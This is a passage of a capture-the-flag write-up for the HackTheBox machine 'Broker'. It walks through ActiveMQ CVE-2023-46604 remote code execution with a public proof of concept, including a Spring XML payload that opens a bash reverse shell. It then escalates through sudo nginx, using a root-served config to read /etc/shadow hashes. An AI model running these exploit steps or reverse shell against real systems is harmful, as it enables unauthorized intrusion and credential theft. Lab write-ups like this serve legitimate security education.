@@ -1,0 +1,630 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Broker</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#htb-broker">htb-broker</a> <a class="post-tag" href="/tags#ubuntu">ubuntu</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#activemq">activemq</a> <a class="post-tag" href="/tags#cve-2023-46604">cve-2023-46604</a> <a class="post-tag" href="/tags#deserialization">deserialization</a> <a class="post-tag" href="/tags#java">java</a> <a class="post-tag" href="/tags#nginx">nginx</a> <a class="post-tag" href="/tags#shared-object">shared-object</a> <a class="post-tag" href="/tags#ldpreload">ldpreload</a> <a class="post-tag" href="/tags#sudo-nginx">sudo-nginx</a> <a class="post-tag" href="/tags#oscp-like-v3">oscp-like-v3</a> </span><br/><br/>
+<time class="dt-published" datetime="2023-11-09T10:45:00+00:00" itemprop="datePublished">Nov 9, 2023
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2023/11/09/htb-broker.html" style="color: #e6e6e6; text-decoration: none;">HTB: Broker</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="/img/broker-cover.webp" type="image/webp"/>
+<img alt="Broker" class="include_image" loading="lazy" src="/img/broker-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:150px;">
+</img></picture>
+<p>Broken is another box released by HackTheBox directly into the non-competitive queue to highlight a big deal vulnerability that’s happening right now. ActiveMQ is a Java-based message queue broker that is very common, and CVE-2023-46604 is an unauthenticated remote code execution vulnerability in ActiveMQ that got the rare 10.0 CVSS imact rating. I’ll exploit this vulnerability to get a foothold, and then escalate to root abusing the right to run nginx as root. I’ll stand up a rogue server to get file read. Then I’ll add PUT capabilities and write an SSH key for root. I’ll also show a method that was used to exploit a similar Zimbra miconfiguration (CVE-2022-41347). In this case, I’ll poison the LD preload file by running nginx with its error logs pointing at that file, and then load a malicious shared object.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/578 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/broker" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Broker</a> <a href="https://hackthebox.com/machines/broker" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-broker.webp" type="image/webp"/> <img alt="Broker" class="img-av" src="/icons/box-broker.png"/></picture></a><br/><a href="https://hackthebox.com/machines/broker" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right">09 Nov 2023</td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">09 Nov 2023</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Easy">Easy [20]</span></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/114053" rel="noopener" target="_blank"><img alt="TheCyberGeek" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/114053" style="display: unset"/><span class="user-text" style="display: none"> TheCyberGeek</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> finds nine open TCP ports:</p>
+<div class="language-console code-collapse highlighter-rouge" data-trunc="1800"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 10.10.11.243                                                       
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2023-11-08 12:58 EST
+Nmap scan report for 10.10.11.243
+Host is up (0.097s latency).
+Not shown: 65526 closed ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+1883/tcp  open  mqtt
+5672/tcp  open  amqp
+8161/tcp  open  patrol-snmp
+39751/tcp open  unknown
+61613/tcp open  unknown
+61614/tcp open  unknown
+61616/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 6.91 seconds 
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,80,1883,5672,8161,39751,61613,61614,61616 <span class="nt">-sCV</span> 10.10.11.243
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2023-11-08 13:00 EST
+Nmap scan report for 10.10.11.243
+Host is up (0.092s latency).
+
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)                                                    
+80/tcp    open  http       nginx 1.18.0 (Ubuntu)
+| http-auth:
+| HTTP/1.1 401 Unauthorized\x0D
+|_  basic realm=ActiveMQRealm
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Error 401 Unauthorized
+1883/tcp  open  mqtt
+|_mqtt-subscribe: ERROR: Script execution failed (use -d to debug)
+5672/tcp  open  amqp?
+|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
+| fingerprint-strings:
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie:        
+|     AMQP
+|     AMQP
+|     amqp:decode-error
+|_    7Connection from client using unsupported AMQP attempted
+8161/tcp  open  http       Jetty 9.4.39.v20210325
+| http-auth:
+| HTTP/1.1 401 Unauthorized\x0D
+|_  basic realm=ActiveMQRealm
+|_http-server-header: Jetty(9.4.39.v20210325)
+|_http-title: Error 401 Unauthorized
+39751/tcp open  tcpwrapped
+61613/tcp open  unknown
+| fingerprint-strings:
+|   HELP4STOMP:
+|     ERROR
+|     content-type:text/plain
+|     message:Unknown STOMP action: HELP
+|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP                                                                       
+|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)                                                        
+|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)                                                        
+|     org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
+|     org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
+|     org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
+|_    java.lang.Thread.run(Thread.java:750)                                    
+61614/tcp open  http       Jetty 9.4.39.v20210325                              
+| http-methods:                                                                
+|_  Potentially risky methods: TRACE                                           
+|_http-server-header: Jetty(9.4.39.v20210325)                                  
+|_http-title: Site doesn't have a title.                                       
+61616/tcp open  apachemq   ActiveMQ OpenWire transport                         
+| fingerprint-strings:
+|   NULL:
+|     ActiveMQ
+|     TcpNoDelayEnabled
+|     SizePrefixDisabled
+|     CacheSize
+|     ProviderName
+|     ActiveMQ
+|     StackTraceEnabled
+|     PlatformDetails
+|     Java
+|     CacheEnabled
+|     TightEncodingEnabled
+|     MaxFrameSize
+|     MaxInactivityDuration
+|     MaxInactivityDurationInitalDelay
+|     ProviderVersion
+|_    5.15.15
+3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :                                                                
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port5672-TCP:V=7.80%I=7%D=11/8%Time=654BCCB3%P=x86_64-pc-linux-gnu%r(Ge
+SF:tRequest,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\
+SF:xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01
+SF:\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20cli
+SF:ent\x20using\x20unsupported\x20AMQP\x20attempted")%r(HTTPOptions,89,"AM
+SF:QP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1
+SF:\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x0
+SF:2\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client\x20using\x2
+SF:0unsupported\x20AMQP\x20attempted")%r(RTSPRequest,89,"AMQP\x03\x01\0\0A
+SF:MQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`
+SF:\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:d
+SF:ecode-error\xa17Connection\x20from\x20client\x20using\x20unsupported\x2
+SF:0AMQP\x20attempted")%r(RPCCheck,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\
+SF:0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x0
+SF:2\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Co
+SF:nnection\x20from\x20client\x20using\x20unsupported\x20AMQP\x20attempted
+SF:")%r(DNSVersionBindReqTCP,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\
+SF:x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\
+SF:0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connecti
+SF:on\x20from\x20client\x20using\x20unsupported\x20AMQP\x20attempted")%r(D
+SF:NSStatusRequestTCP,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0
+SF:\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x1
+SF:8\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20f
+SF:rom\x20client\x20using\x20unsupported\x20AMQP\x20attempted")%r(SSLSessi
+SF:onReq,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0
+SF:\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S
+SF:\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client
+SF:\x20using\x20unsupported\x20AMQP\x20attempted")%r(TerminalServerCookie,
+SF:89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x
+SF:04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\x
+SF:c0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client\x20us
+SF:ing\x20unsupported\x20AMQP\x20attempted");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port61613-TCP:V=7.80%I=7%D=11/8%Time=654BCCAE%P=x86_64-pc-linux-gnu%r(H
+SF:ELP4STOMP,27F,"ERROR\ncontent-type:text/plain\nmessage:Unknown\x20STOMP
+SF:\x20action:\x20HELP\n\norg\.apache\.activemq\.transport\.stomp\.Protoco
+SF:lException:\x20Unknown\x20STOMP\x20action:\x20HELP\n\tat\x20org\.apache
+SF:\.activemq\.transport\.stomp\.ProtocolConverter\.onStompCommand\(Protoc
+SF:olConverter\.java:258\)\n\tat\x20org\.apache\.activemq\.transport\.stom
+SF:p\.StompTransportFilter\.onCommand\(StompTransportFilter\.java:85\)\n\t
+SF:at\x20org\.apache\.activemq\.transport\.TransportSupport\.doConsume\(Tr
+SF:ansportSupport\.java:83\)\n\tat\x20org\.apache\.activemq\.transport\.tc
+SF:p\.TcpTransport\.doRun\(TcpTransport\.java:233\)\n\tat\x20org\.apache\.
+SF:activemq\.transport\.tcp\.TcpTransport\.run\(TcpTransport\.java:215\)\n
+SF:\tat\x20java\.lang\.Thread\.run\(Thread\.java:750\)\n\0\n");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port61616-TCP:V=7.80%I=7%D=11/8%Time=654BCCAE%P=x86_64-pc-linux-gnu%r(N
+SF:ULL,140,"\0\0\x01&lt;\x01ActiveMQ\0\0\0\x0c\x01\0\0\x01\*\0\0\0\x0c\0\x11T
+SF:cpNoDelayEnabled\x01\x01\0\x12SizePrefixDisabled\x01\0\0\tCacheSize\x05
+SF:\0\0\x04\0\0\x0cProviderName\t\0\x08ActiveMQ\0\x11StackTraceEnabled\x01
+SF:\x01\0\x0fPlatformDetails\t\0\x04Java\0\x0cCacheEnabled\x01\x01\0\x14Ti
+SF:ghtEncodingEnabled\x01\x01\0\x0cMaxFrameSize\x06\0\0\0\0\x06@\0\0\0\x15
+SF:MaxInactivityDuration\x06\0\0\0\0\0\0u0\0\x20MaxInactivityDurationInita
+SF:lDelay\x06\0\0\0\0\0\0'\x10\0\x0fProviderVersion\t\0\x075\.15\.15");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 175.22 seconds        
+</span></code></pre></div></div>
+<p>My initial assessment of the ports is:</p>
+<ul>
+<li>SSH on 22 will be useful if I find creds.</li>
+<li>There’s a website hosted with nginx on 80, but it’s returning a 401 unauthorized.</li>
+<li>61613 and 61616 both reference <a href="https://activemq.apache.org/">ActiveMQ</a>. The page talks about how it is a Java application uses AMQP and MQTT. These other ports likely supporting it:
+    <ul>
+<li>Two ports are message queue related, <a href="https://mqtt.org/">mqtt</a> on 1883 and <a href="https://www.amqp.org/">amqp</a> on 5672.</li>
+<li>8161 and 61614 show the Java webserver Jetty.</li>
+</ul>
+</li>
+<li>39751 is unknown</li>
+</ul>
+<p>Based on the <a href="https://packages.ubuntu.com/search?keywords=openssh-server">OpenSSH</a> version, the host is likely running Ubuntu 22.04 jammy.</p>
+<h3 id="website---tcp-80">Website - TCP 80</h3>
+<p>Visiting the site just asks for HTTP basic auth:</p>
+<picture>
+<source srcset="/img/image-20231108131635946.webp" type="image/webp"/>
+<img alt="image-20231108131635946" class="include_image" loading="lazy" src="/img/image-20231108131635946.png"/>
+</picture>
+<p>Trying “admin” / “admin” works. It’s an admin interface for ActiveMQ:</p>
+<picture>
+<source srcset="/img/image-20231108131725149.webp" type="image/webp"/>
+<img alt="image-20231108131725149" class="include_image" loading="lazy" src="/img/image-20231108131725149.png"/>
+</picture>
+<p>The “Manage ActiveMQ broker” link leads to <code class="language-plaintext highlighter-rouge">/admin/</code>:</p>
+<picture>
+<source srcset="/img/image-20231108131810161.webp" type="image/webp"/>
+<img alt="image-20231108131810161" class="include_image" loading="lazy" src="/img/image-20231108131810161.png"/>
+</picture>
+<p>This gives the broker ID, uptime, version, etc.</p>
+<h3 id="activemq">ActiveMQ</h3>
+<p>ActiveMQ is a very popular open-source message broker. Message brokers are designed to manage communications between different systems (often written in different languages). For example, if a transaction is requested through a bank’s webserver, it may need to contact a different backend server to process that transaction. If the webserver does that on it’s own, there’s a lot of risk for things like outages and missed communications. Instead it might use a message broker that will handle taking the request and making sure it reaches the other server.</p>
+<h2 id="shell-as-activemq">Shell as activemq</h2>
+<h3 id="identify-vulnerability">Identify Vulnerability</h3>
+<p>This box has been released on HackTheBox directly to retired as a chance to show off a newsworthy vulnerability, <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-46604">CVE-2023-46604</a> in ActiveMQ. Searching for “ActiveMQ vulnerability” will turn up all sorts of articles about ransomware crews using this attack to own ActiveMQ servers:</p>
+<div style="position: relative;">
+<picture>
+<source srcset="/img/image-20231108132709461.webp" type="image/webp"/>
+<img alt="image-20231108132709461" class="include_image" loading="lazy" src="/img/image-20231108132709461.png" style="max-height: 500px; object-fit: cover; object-position: top; width: -webkit-fill-available; mask-image: linear-gradient(rgb(0, 0, 0), rgb(0,0,0) calc(100% - 100px), rgba(0,0,0,0) calc(100% - 20px)); -webkit-mask-image: linear-gradient(rgb(0, 0, 0), rgb(0,0,0) calc(100% - 100px), rgba(0,0,0,0) calc(100% - 20px));"/>
+</picture>
+<a href="javascript:void(0)" onclick="click_expand_image(event)" style="position: absolute; bottom: 35px; right: 15px;" title="Click to expand for full content"><img alt="expand" class="expand-contract" src="/icons/expand.png"/></a>
+</div>
+<p>The vulnerability is very easy to exploit and unauthenticated, getting the very rare top CVSS score of 10.0. ActiveMQ has a bunch of different versions, but in the 5.15 group, anything before 5.15.16 is vulnerable (including Broker’s 5.15.15).</p>
+<h3 id="understand-exploit">Understand Exploit</h3>
+<p>evkl1d has a <a href="https://github.com/evkl1d/CVE-2023-46604">Python POC</a> on GitHub that’s useful for both understanding the vulnerability and exploiting it.</p>
+<p>The Python code takes a target IP, port (default 61616), and “Spring XML Url”. It builds a payload which looks like a serialized object, as it starts with a header, then a series of objects that start with their length and then their value. It converts to hex, and send this as a message to ActiveMQ port.</p>
+<p>The payload is exploiting a deserialization vulnerability in ActiveMQ, and using a gadget from the Spring to load a remote XML file, which has the ability to run programs.</p>
+<p>For a much more detailed look at the exploit, <a href="https://deepkondah.medium.com/unpacking-the-apache-activemq-exploit-cve-2023-46604-92ed1c125b53">this medium post</a> does a nice job, and pulls from original research from X1r0z (<a href="https://exp10it.cn/2023/10/apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-rce-%E5%88%86%E6%9E%90/?ref=deep-kondah.com">original post in Chinese</a>).</p>
+<h3 id="run-poc">Run POC</h3>
+<p>To run the POC, I can start with a Python webserver and run the Python script:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>python exploit.py <span class="nt">-i</span> 10.10.11.243 <span class="nt">-u</span> http://10.10.14.6/test.xml
+<span class="go">     _        _   _           __  __  ___        ____   ____ _____ 
+    / \   ___| |_(_)_   _____|  \/  |/ _ \      |  _ \ / ___| ____|
+   / _ \ / __| __| \ \ / / _ \ |\/| | | | |_____| |_) | |   |  _|  
+  / ___ \ (__| |_| |\ V /  __/ |  | | |_| |_____|  _ &lt;| |___| |___ 
+ /_/   \_\___|\__|_| \_/ \___|_|  |_|\__\_\     |_| \_\\____|_____|
+
+[*] Target: 10.10.11.243:61616
+[*] XML URL: http://10.10.14.6/poc.xml
+
+[*] Sending packet: 0000006c1f000000000000000000010100426f72672e737072696e676672616d65776f726b2e636f6e746578742e737570706f72742e436c61737350617468586d6c4170706c69636174696f6e436f6e74657874010019687474703a2f2f31302e31302e31342e362f706f632e786d6c
+</span></code></pre></div></div>
+<p>There is a hit at my websertver (twice actually):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">10.10.11.243 - - [08/Nov/2023 13:33:53] code 404, message File not found
+10.10.11.243 - - [08/Nov/2023 13:33:53] "GET /test.xml HTTP/1.1" 404 -
+10.10.11.243 - - [08/Nov/2023 13:34:26] code 404, message File not found
+10.10.11.243 - - [08/Nov/2023 13:34:26] "GET /test.xml HTTP/1.1" 404 -
+</span></code></pre></div></div>
+<p>So I need to look at this XML file. The exploit comes with <code class="language-plaintext highlighter-rouge">poc.xml</code>:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span>
+    <span class="nt">&lt;beans</span> <span class="na">xmlns=</span><span class="s">"http://www.springframework.org/schema/beans"</span>
+       <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span>
+       <span class="na">xsi:schemaLocation=</span><span class="s">"
+     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">"pb"</span> <span class="na">class=</span><span class="s">"java.lang.ProcessBuilder"</span> <span class="na">init-method=</span><span class="s">"start"</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;constructor-arg&gt;</span>
+            <span class="nt">&lt;list&gt;</span>
+                <span class="nt">&lt;value&gt;</span>bash<span class="nt">&lt;/value&gt;</span>
+                <span class="nt">&lt;value&gt;</span>-c<span class="nt">&lt;/value&gt;</span>
+                <span class="nt">&lt;value&gt;</span>bash -i <span class="ni">&amp;gt;&amp;amp;</span> /dev/tcp/10.10.10.10/9001 0<span class="ni">&amp;gt;&amp;amp;</span>1<span class="nt">&lt;/value&gt;</span>
+            <span class="nt">&lt;/list&gt;</span>
+            <span class="nt">&lt;/constructor-arg&gt;</span>
+        <span class="nt">&lt;/bean&gt;</span>
+    <span class="nt">&lt;/beans&gt;</span>
+</code></pre></div></div>
+<p>It’s clearly calling a classic <a href="https://www.youtube.com/watch?v=OjkVep2EIlw">bash reverse shell</a>, <code class="language-plaintext highlighter-rouge">bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.10.10/9001'</code>. I’ll update the payload to my IP address and host it with the Python webserver.</p>
+<p>With <code class="language-plaintext highlighter-rouge">nc</code> listening on 9001, I’ll run the exploit again. It fetches <code class="language-plaintext highlighter-rouge">poc.xml</code> (twice):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">10.10.11.243 - - [08/Nov/2023 13:34:37] "GET /poc.xml HTTP/1.1" 200 -
+10.10.11.243 - - [08/Nov/2023 13:34:37] "GET /poc.xml HTTP/1.1" 200 -
+</span></code></pre></div></div>
+<p>And then a shell at <code class="language-plaintext highlighter-rouge">nc</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 9001
+<span class="go">Listening on 0.0.0.0 9001
+Connection received on 10.10.11.243 60298
+bash: cannot set terminal process group (880): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">activemq@broker:/opt/apache-activemq-5.15.15/bin$</span><span class="w">
+</span></code></pre></div></div>
+<p>I’ll do a <a href="https://www.youtube.com/watch?v=DqE6DxqJg8Q">shell upgrade</a>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">activemq@broker:/opt/apache-activemq-5.15.15/bin$</span><span class="w"> </span>script /dev/null <span class="nt">-c</span> bash
+<span class="go">script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+</span><span class="gp">activemq@broker:/opt/apache-activemq-5.15.15/bin$</span><span class="w"> </span>^Z
+<span class="go">[1]+  Stopped                 nc -lnvp 9001
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span> <span class="p">;</span> <span class="nb">fg</span>
+<span class="go">nc -lnvp 9001
+             reset
+reset: unknown terminal type unknown
+Terminal type? screen
+</span><span class="gp">activemq@broker:/opt/apache-activemq-5.15.15/bin$</span><span class="w"> 
+</span></code></pre></div></div>
+<p>And grab <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">activemq@broker:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">61b5553d************************
+</span></code></pre></div></div>
+<h2 id="shell-as-root">Shell as root</h2>
+<h3 id="enumeration">Enumeration</h3>
+<p>The activemq user can run <code class="language-plaintext highlighter-rouge">nginx</code> as root with no password:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">activemq@broker:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="go">Matching Defaults entries for activemq on broker:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User activemq may run the following commands on broker:
+    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
+</span></code></pre></div></div>
+<h3 id="create-malicious-webserver">Create Malicious Webserver</h3>
+<h4 id="file-read">File Read</h4>
+<p>With <code class="language-plaintext highlighter-rouge">sudo nginx</code>, I solved this by standing up my own server as root. <a href="https://www.nginx.com/resources/wiki/start/topics/examples/full/">This page</a> has example configs. Mine is quite simple. <code class="language-plaintext highlighter-rouge">user</code> will be root. It must have an <code class="language-plaintext highlighter-rouge">events</code> section to define the number of workers, so I’ll pick something arbitrary. Then I make an <code class="language-plaintext highlighter-rouge">http</code> section with a server that is hosted from the system root:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">user</span> <span class="n">root</span><span class="p">;</span>
+<span class="n">events</span> <span class="p">{</span>
+    <span class="n">worker_connections</span> <span class="mi">1024</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="n">http</span> <span class="p">{</span>
+    <span class="n">server</span> <span class="p">{</span>
+        <span class="n">listen</span> <span class="mi">1337</span><span class="p">;</span>
+        <span class="n">root</span> <span class="o">/</span><span class="p">;</span>
+        <span class="n">autoindex</span> <span class="n">on</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>I’ll start the webserver by running <code class="language-plaintext highlighter-rouge">nginx</code> with <code class="language-plaintext highlighter-rouge">-c</code> and the full path to this file.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">activemq@broker:~$</span><span class="w"> </span><span class="nb">sudo</span> /usr/sbin/nginx <span class="nt">-c</span> /dev/shm/0xdf.conf 
+</code></pre></div></div>
+<p>Then I can query this webserver on 1337 and read files as root:</p>
+<div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">activemq@broker:~$ </span>curl localhost:1337/etc/shadow             
+<span class="go">root:$y$j9T$S6NkiGlTDU3IUcdBZEjJe0$sSHRUiGL/v4FZkWjU.HZ6cX2vsMY/rdFBTt25LbGxf1:19666:0:99999:7:::
+daemon:*:19405:0:99999:7:::
+bin:*:19405:0:99999:7:::
+sys:*:19405:0:99999:7:::
+sync:*:19405:0:99999:7:::
+games:*:19405:0:99999:7:::
+man:*:19405:0:99999:7:::
+lp:*:19405:0:99999:7:::
+mail:*:19405:0:99999:7:::
+news:*:19405:0:99999:7:::
+uucp:*:19405:0:99999:7:::
+proxy:*:19405:0:99999:7:::
+www-data:*:19405:0:99999:7:::
+backup:*:19405:0:99999:7:::
+list:*:19405:0:99999:7:::
+irc:*:19405:0:99999:7:::
+gnats:*:19405:0:99999:7:::
+nobody:*:19405:0:99999:7:::
+_apt:*:19405:0:99999:7:::
+systemd-network:*:19405:0:99999:7:::
+systemd-resolve:*:19405:0:99999:7:::
+messagebus:*:19405:0:99999:7:::
+systemd-timesync:*:19405:0:99999:7:::
+pollinate:*:19405:0:99999:7:::
+sshd:*:19405:0:99999:7:::
+syslog:*:19405:0:99999:7:::
+uuidd:*:19405:0:99999:7:::
+tcpdump:*:19405:0:99999:7:::
+tss:*:19405:0:99999:7:::
+landscape:*:19405:0:99999:7:::
+fwupd-refresh:*:19405:0:99999:7:::
+usbmux:*:19474:0:99999:7:::
+lxd:!:19474::::::
+activemq:$y$j9T$5eMce1NhiF0t9/ZVwn39P1$pCfvgXtARGXPYDdn2AVdkCnXDf7YO7He/x666g6qLM5:19666:0:99999:7:::
+_laurel:!:19667::::::
+</span></code></pre></div></div>
+<p>This is enough to get the flag and solve the box:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">activemq@broker:~$</span><span class="w"> </span>curl localhost:1337/root/root.txt
+<span class="go">8a207d68************************
+</span></code></pre></div></div>
+<h4 id="file-write">File Write</h4>
+<p>nginx can also handle PUT requests which write files. I’ll update the config to include enabling PUTs:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">user</span> <span class="n">root</span><span class="p">;</span>
+<span class="n">events</span> <span class="p">{</span>
+    <span class="n">worker_connections</span> <span class="mi">1024</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="n">http</span> <span class="p">{</span>
+    <span class="n">server</span> <span class="p">{</span>
+        <span class="n">listen</span> <span class="mi">1338</span><span class="p">;</span>
+        <span class="n">root</span> <span class="o">/</span><span class="p">;</span>
+        <span class="n">autoindex</span> <span class="n">on</span><span class="p">;</span>
+        <span class="n">dav_methods</span> <span class="n">PUT</span><span class="p">;</span>
+    <span class="p">}</span>
